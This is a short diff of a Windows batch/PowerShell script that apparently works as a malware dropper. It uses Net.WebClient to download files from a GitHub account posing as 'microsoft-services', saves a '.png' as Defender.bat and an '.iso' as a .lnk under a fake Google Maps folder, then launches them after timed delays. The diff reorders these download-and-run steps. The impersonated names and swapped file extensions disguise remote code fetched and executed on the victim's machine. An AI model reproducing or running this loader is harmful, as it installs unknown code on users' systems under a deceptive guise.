@@ -106,15 +106,17 @@ start-sleep -s 9
  
  start-sleep -s 9
   
-  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
 
- start-sleep -s 9
 
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.png', 'C:\ProgramData\Google\Maps\Defender.bat') }"
 
  start-sleep -s 9
+
   Start "C:\ProgramData\Google\Maps\Defender.lnk"
 
+ start-sleep -s 9
+
+  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
 
 
 
